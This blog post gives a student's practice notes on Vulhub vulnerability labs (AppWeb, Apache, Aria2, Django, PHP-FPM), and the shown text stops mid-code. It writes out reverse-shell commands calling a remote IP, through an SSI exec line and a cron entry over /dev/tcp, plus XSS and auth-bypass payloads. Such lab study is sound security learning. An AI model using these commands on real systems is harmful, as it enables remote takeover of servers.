<!DOCTYPE html>
<html>
  
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta name="author" content="FengHLZ">
  
  
  <title>vulhub练习笔记 | xyz|All</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="Web安全,">
  

  
  <meta name="description" content="项目地址：https://vulhub.org/">

  

  <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  
    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
    welcome: {"enable":true,"interval":30},
    start_time: "2018-07-09",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "FengHLZ",
    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
    mathjax: true,
    page_type: ""
  };
</script>

  <script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>

  
    <link rel="icon" href="/images/siteimage.jpg">
    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  <link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">

  
</head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">FengHLZ.xyz</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | Know it - Do it</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/categories/" target="_self">分类</a>
      
        <a href="/friends/" target="_self">友链</a>
      
        <a href="/about/" target="_self">关于</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/FengHLZ" target="_blank">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
    </div>
  </div>
</header>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2019-06-20
    </span>
    
      <span>
        | <a href="/categories/Web安全/"><i class="fa fa-bookmark"></i>Web安全</a>
      </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    vulhub练习笔记
  </h1>
  
  <article class="passage-article">
    <p>练习优先熟悉的框架。</p>
<h2 id="AppWeb认证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715）"></a>AppWeb认证绕过漏洞（CVE-2018-8715）</h2><h3 id="相关介绍"><a href="#相关介绍" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>AppWeb是嵌入式Web Server。<br>AppWeb<strong>可以进行认证配置</strong>，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
<p>其<strong>7.0.3之前</strong>的版本中，对于<strong>digest和form两种认证方式</strong>，如果用户传入的<strong>密码为null</strong>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用该漏洞<strong>需要知道一个已存在的用户名</strong>，当前环境下用户名为admin。<br>抓到该页面的包后，将其构造为如下数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username=admin</span><br></pre></td></tr></table></figure></p>
<p><img src="./IDNzzoW.png" alt></p>
<p>如图，我们<strong>没有传入密码字段</strong>，所以服务器出现了错误，直接返回了200，而且包含了一个session。</p>
<p>设置这个session到浏览器，即可正常访问需要认证的页面。（复现中这一步遇到了问题）</p>
<h3 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h3><p>整个过程还是很好理解，关键是数据包构造正确<br><strong>关于cookie的设置：</strong><br>服务器会返回我们set-cookie头，只需要将其zai浏览器中设置即可。但是Cookie Manager不会用啊。。<br><strong>我的解决方法：</strong><br>抓到首页的包后，直接在<code>proxy</code> 模块中修改数据包，再将其发送。这样浏览器就会接收相应的响应包，并设置好cookie。</p>
<h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><h3 id="相关介绍-1"><a href="#相关介绍-1" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本中存在一个解析漏洞</strong>，在解析PHP时，<strong>1.php\x0A</strong>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞已经在ACTF2019学习过了，参考笔记：<br><a href="https://hackmd.io/MHyg6ypiQV2AjAeqHF5dyw#%E5%88%A9%E7%94%A8Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%BB%91%E5%90%8D%E5%8D%95%E3%80%900a%E3%80%91" target="_blank" rel="noopener">https://hackmd.io/MHyg6ypiQV2AjAeqHF5dyw#%E5%88%A9%E7%94%A8Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%BB%91%E5%90%8D%E5%8D%95%E3%80%900a%E3%80%91</a></p>
<h3 id="知识总结-1"><a href="#知识总结-1" class="headerlink" title="知识总结"></a>知识总结</h3><ul>
<li>题目中上传文件的同时，也POST一个name，它的值就是上传的文件的文件名。<br>  肯定就要想到这个值就是用来在后台判断文件的！<br>  相应的就是要在这个值后面加上%0a绕过。</li>
<li>需要在 <code>$_POST[&#39;name&#39;]</code> 后面添加 %0a 。</li>
<li>需要注意的是，后台获取文件名时不能用 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，因为他会自动把换行去掉。将会利用不成功。</li>
<li>访问时需要加上%0a</li>
</ul>
<h2 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h2><h3 id="相关介绍-2"><a href="#相关介绍-2" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure></p>
<p>其给<code>.html</code>后缀增加了media-type，值为text/html；给<code>.cn</code>后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。</p>
<hr>
<p>如果运维人员给.php后缀增加了处理器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure></p>
<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀，即会被识别成PHP文件，<strong>没必要是最后一个后缀</strong>。利用这个特性，将会造成一个可以<strong>绕过上传白名单</strong>的解析漏洞。（本次漏洞环境已经按如上设置好了处理器）</p>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>进入环境上传文件后，限制了文件后缀<br><img src="./PqObrvp.png" alt></p>
<hr>
<p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p>
<p><img src="./KRKnSil.png" alt></p>
<hr>
<p>菜刀可以直接连接成功：<br><img src="./vXa1tlX.png" alt><br><img src="./7YbOGdW.png" alt></p>
<h3 id="知识总结-2"><a href="#知识总结-2" class="headerlink" title="知识总结"></a>知识总结</h3><p>题目的关键在于设置了相关的解析处理器。<br>在文件上传漏洞中，用的较多的还有<code>.htaccess</code> 文件。</p>
<blockquote>
<p>htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。</p>
<p>很多时候，如果你已经安装了内容管理系统（CMS），比如Drupal，Joomla或者Wordpress，你可能会遇到.htaccess文件。 一般来说你不需要编辑它，但这个文件是你上传到Web服务器的文件之一。</p>
<p>.htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。</p>
</blockquote>
<p>学习资料：<br><a href="https://zhuanlan.zhihu.com/p/31763240" target="_blank" rel="noopener">htaccess文件的利用技巧</a></p>
<h2 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h2><h3 id="相关介绍-3"><a href="#相关介绍-3" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>当目标服务器开启了SSI与CGI支持，我们就可以上传shtml文件，利用<!--#exec cmd="id" -->语法执行命令。</p>
<hr>
<p>SSI：SSI（<strong>服务器端包含</strong>）是放置在HTML页面中的指令，并在提供页面时在服务器上进行评估。它们允许将动态生成的内容添加到现有HTML页面，而无需通过CGI程序或其他动态技术提供整个页面。<br><strong>SSI exec命令</strong>。它在文档中插入CGI脚本或shell命令的输出。</p>
<p>使用方法：cmd后面跟你要执行的命令就可以了。<br><code>&lt;!--#exec cmd=&quot;&quot; --&gt;</code></p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>upload.php页面支持上传<code>.shtml</code> 文件，直接构造反弹shell的命令。<br><code>&lt;!--#exec cmd=&quot;curl 47.112.16.34|bash&quot; --&gt;</code><br>命名为a.shtml<br>成功上传：<br><img src="./bEfj3Ae.png" alt><br>在服务器上监听端口。访问a.shtml文件，可以看到浏览器一直处于请求状态，服务器也已将成功反弹shell。<br><img src="./euDnyM2.png" alt></p>
<h3 id="知识总结-3"><a href="#知识总结-3" class="headerlink" title="知识总结"></a>知识总结</h3><p>无</p>
<h2 id="Aria2-任意文件写入漏洞"><a href="#Aria2-任意文件写入漏洞" class="headerlink" title="Aria2 任意文件写入漏洞"></a>Aria2 任意文件写入漏洞</h2><h3 id="相关介绍-4"><a href="#相关介绍-4" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Aria2是一个命令行下轻量级、多协议、多来源的<strong>下载工具</strong>（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建<code>XML-RPC</code>和<code>JSON-RPC</code>接口。在有权限的情况下，我们可以<strong>使用RPC接口来操作aria2来下载文件，将文件下载至任意目录</strong>，造成一个任意文件写入漏洞。</p>
<hr>
<p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/" target="_blank" rel="noopener">http://binux.github.io/yaaw/demo/</a> 。</p>
<h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打开yaaw，点击<code>Settings</code>按钮，填入运行aria2的目标域名：<a href="http://your-ip:6800/jsonrpc" target="_blank" rel="noopener">http://your-ip:6800/jsonrpc</a> （默认端口为6800）：<br><img src="./h0cFQKQ.png" alt></p>
<hr>
<p>通过写入一个<strong>crond任务</strong>来反弹shell<br>shell内容如下，注意使用linux生成：<br><code>* * * * * bash -i &gt; /dev/tcp/47.112.16.34/1337 0&lt;&amp;1 2&gt;&amp;1</code></p>
<hr>
<p>需要注意crontab文件的格式，以及换行符必须是<code>\n</code>，且文件结尾需要有一个换行符。<br>可以使用如下命令来查看文件内容：<br><img src="./qiWYlqS.png" alt></p>
<hr>
<p>接着将crontab文件放到自己服务器上<br>然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。<br><img src="./2nCSDFZ.png" alt><br>这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell。<br>然而我还是没有反弹成功。。。</p>
<h3 id="知识总结-4"><a href="#知识总结-4" class="headerlink" title="知识总结"></a>知识总结</h3><ul>
<li><p>crontab文件介绍<br>  当我们要增加全局性的计划任务时，一种方式是直接修改/etc/crontab。但是，一般不建议这样做，/etc/cron.d目录就是为了解决这种问题而创建的。<br>  cron执行时，也就是要读取三个地方的配置文件：一是/etc/crontab，二是/etc/cron.d目录下的所有文件，三是每个用户的配置文件</p>
<hr>
<p>  学习资料：<a href="https://blog.51cto.com/huangfu3342/1608549" target="_blank" rel="noopener">https://blog.51cto.com/huangfu3342/1608549</a></p>
</li>
<li>反弹shell新姿势——通过写入一个crond任务来反弹shell</li>
</ul>
<h2 id="Django-debug-page-XSS漏洞（CVE-2017-12794）"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）"></a>Django debug page XSS漏洞（CVE-2017-12794）</h2><h3 id="相关介绍-5"><a href="#相关介绍-5" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Django发布的新版本1.11.5，修复了500页面中可能存在的一个XSS漏洞。<br>下面是用1.11.4和1.11.5进行比较：</p>
<blockquote>
<p>git clone <code>https://github.com/django/django.git</code><br>cd django<br>git diff 1.11.4 1.11.5 django/views/debug.py</p>
</blockquote>
<p><img src="https://vulhub.org/vulhub/django/CVE-2017-12794/img/django/sp170908_035017.png" alt="link text"></p>
<p>外部关闭了全局转义，然后在这两个地方增加了强制转义。那么，漏洞肯定是在这个位置触发的。<br><strong>也就是将输出的内容全部进行了强制转义。</strong></p>
<hr>
<p><strong>The above exception was the direct cause of the following exception:</strong><br>一般是在<strong>出现数据库异常</strong>的时候，会抛出这样的错误语句。</p>
<hr>
<p>做个简单的测试，在Django命令行下，我们创建一个username为phith0n的用户，然后再次创建一个username为phith0n的用户，则会抛出一个IntegrityError异常：<br><img src="https://vulhub.org/vulhub/django/CVE-2017-12794/img/django/sp170908_040738.png" alt="link text"><br>见上图，原因是触发了数据库的Unique异常。</p>
<p>为什么Django会引入这样一个异常机制？这是为了方便开发者进行SQL错误的调试，因为<strong>Django的模型最终是操作数据库</strong>，数据库中具体出现什么错误，是Django无法100%预测的。那么，<strong>为了方便开发者快速找到是哪个操作触发了数据库异常</strong>，就需要<strong>将这两个异常回溯栈关联到一块</strong>。</p>
<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>P神的测试：发现在使用Postgres数据库并触发异常的时候，psycopg2<strong>会将字段名和字段值全部抛出</strong>。那么，如果字段值中包含我们可控的字符串，这个字符串其实就会被设置成<strong>cause</strong>，<strong>最后被显示在页面中</strong>。<br>流程：</p>
<ol>
<li>用户注册页面，<strong>未检查用户名</strong></li>
<li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li>
<li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li>
<li>触发duplicate key异常，导致XSS漏洞</li>
</ol>
<p><img src="./FBmrgdd.png" alt><br>可见，Postgres抛出的异常为</p>
<blockquote>
<p><code>duplicate key value violates unique constraint &quot;xss_user_username_key&quot;
DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.</code></p>
</blockquote>
<p>这个异常被拼接进<code>The above exception () was the direct cause of the following exception</code>，最后触发XSS。</p>
<h3 id="知识总结-5"><a href="#知识总结-5" class="headerlink" title="知识总结"></a>知识总结</h3><ul>
<li>关于哪个操作触发了数据库异常，需要两个异常回溯栈</li>
<li>两个异常都会拼接显示出来</li>
<li>没有合法输入检测，没有过滤输出</li>
</ul>
<h2 id="Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）"></a>Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</h2><h3 id="相关介绍-6"><a href="#相关介绍-6" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Django默认配置下，如果匹配上的<strong>URL路由中最后一位是<code>/</code></strong>，而用户访问的时候<strong>没加<code>/</code></strong>，Django<strong>默认会跳转到带<code>/</code>的请求中</strong>。<br>（由配置项中的django.middleware.common.CommonMiddleware、APPEND_SLASH来决定）。</p>
<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>该漏洞利用条件是目标<code>URLCONF</code>中存在<strong>能匹配上</strong><code>//example.com</code>的规则。</p>
<hr>
<p>在<code>path</code>开头为<code>//example.com</code>的情况下，Django没做处理，<strong>导致浏览器认为目的地址是绝对路径</strong>，最终造成任意URL跳转漏洞。</p>
<hr>
<p>docker 又出问题了，复现不了了。<br>偷图：<br><img src="https://raw.githubusercontent.com/vulhub/vulhub/master/django/CVE-2018-14574/1.png" alt="image alt"></p>
<h3 id="知识总结-6"><a href="#知识总结-6" class="headerlink" title="知识总结"></a>知识总结</h3><p>感觉是个无关痛痒的漏洞。</p>
<h2 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h2><h3 id="相关介绍-7"><a href="#相关介绍-7" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>首看P神博客：<a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></p>
<p>再贴一张图：<br><img src="./p3hak8Q.png" alt></p>
<h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境搭建好后，Django后台的模型<code>Collection</code>的管理页面<code>http://your-ip:port/admin/vuln/collection/</code></p>
<p>其中<code>detail</code>是模型<code>Collection中的JSONField</code><br><img src="./hXN92Qz.png" alt></p>
<p>在<code>GET</code>参数中构造<code>detail__a&#39;b=123</code>提交<br><img src="./SXJM6ja.png" alt><br>可以看到报错语句，说明这里存在SQL注入。<br>exp姿势：<br><a href="https://nosec.org/home/detail/2831.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2831.html</a><br><a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">https://xz.aliyun.com/t/5896</a><br>exp没看太懂，留个坑。。</p>
<h3 id="知识总结-7"><a href="#知识总结-7" class="headerlink" title="知识总结"></a>知识总结</h3><ul>
<li>Postgresql支持的数据类型更加丰富，其对JSON格式数据的支持也让这个关系型数据库拥有了NoSQL的一些特点。<br>  在Django中也支持了Postgresql的数据类型：<ul>
<li>JSONField</li>
<li>ArrayField</li>
<li>HStoreField</li>
</ul>
</li>
<li>该漏洞需要开发者使用了<code>JSONField/HStoreField</code>，且用户可控<code>queryset</code>查询时的键名，在键名的位置注入SQL语句。<strong>Django自带的后台应用Django-Admin中就存在这样的写法。</strong></li>
<li>exp好好学习</li>
</ul>
<h2 id="PHP-FPM-Fastcgi-未授权访问漏洞"><a href="#PHP-FPM-Fastcgi-未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi 未授权访问漏洞"></a>PHP-FPM Fastcgi 未授权访问漏洞</h2><h3 id="相关介绍-8"><a href="#相关介绍-8" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>大二的时候在web组组会的时候，学长就要我们看会这个漏洞。奈何当初静不下心来，今天好好搞懂，总结一下。（<strong>学习链接</strong>：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> ）</p>
<hr>
<h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><ul>
<li>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</li>
<li>fastcgi协议是服务器中间件和某个语言后端进行数据交换的协议。</li>
<li>Fastcgi协议由多个record组成。<br>  record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</li>
<li>FPM是一个fastcgi<strong>协议解析器</strong>。<br>  Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</li>
</ul>
<hr>
<p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">    <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_FILENAME'</span>: <span class="string">'/var/www/html/index.php'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">'/index.php'</span>,</span><br><span class="line">    <span class="string">'QUERY_STRING'</span>: <span class="string">'?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'REQUEST_URI'</span>: <span class="string">'/index.php?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'DOCUMENT_ROOT'</span>: <span class="string">'/var/www/html'</span>,</span><br><span class="line">    <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">    <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'REMOTE_PORT'</span>: <span class="string">'12345'</span>,</span><br><span class="line">    <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">    <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p>
<hr>
<h4 id="Nginx（IIS7）解析漏洞"><a href="#Nginx（IIS7）解析漏洞" class="headerlink" title="Nginx（IIS7）解析漏洞"></a>Nginx（IIS7）解析漏洞</h4><p>该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</p>
<p>用户请求<code>http://127.0.0.1/favicon.ico/.php，nginx</code>将会发送如下环境变量到fpm里：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'SCRIPT_FILENAME'</span>: <span class="string">'/var/www/html/favicon.ico/.php'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">'/favicon.ico/.php'</span>,</span><br><span class="line">    <span class="string">'REQUEST_URI'</span>: <span class="string">'/favicon.ico/.php'</span>,</span><br><span class="line">    <span class="string">'DOCUMENT_ROOT'</span>: <span class="string">'/var/www/html'</span>,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>正常来说，SCRIPT_FILENAME的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>
<p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p>
<p>正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。</p>
<h3 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul>
<li>PHP-FPM默认监听9000端口，<strong>如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</strong></li>
<li><code>SCRIPT_FILENAME</code>的值格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404.</li>
<li>如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。<br>  使用源安装php后，默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</li>
<li><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件。</li>
<li><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</li>
<li>设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要<strong>把待执行的代码放在Body中</strong>，他们就能被执行了。</li>
<li>还需要开启远程文件包含选项<code>allow_url_include</code>。</li>
<li><code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项。</li>
<li><code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</li>
<li>最后传入如下环境变量：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">    <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_FILENAME'</span>: <span class="string">'/var/www/html/index.php'</span>,</span><br><span class="line">    <span class="string">'SCRIPT_NAME'</span>: <span class="string">'/index.php'</span>,</span><br><span class="line">    <span class="string">'QUERY_STRING'</span>: <span class="string">'?a=1&amp;b=2'</span>,</span><br><span class="line">    <span class="string">'REQUEST_URI'</span>: <span class="string">'/index.php?a=1&amp;b=2'</span>,</span><br><span class="line">    <span 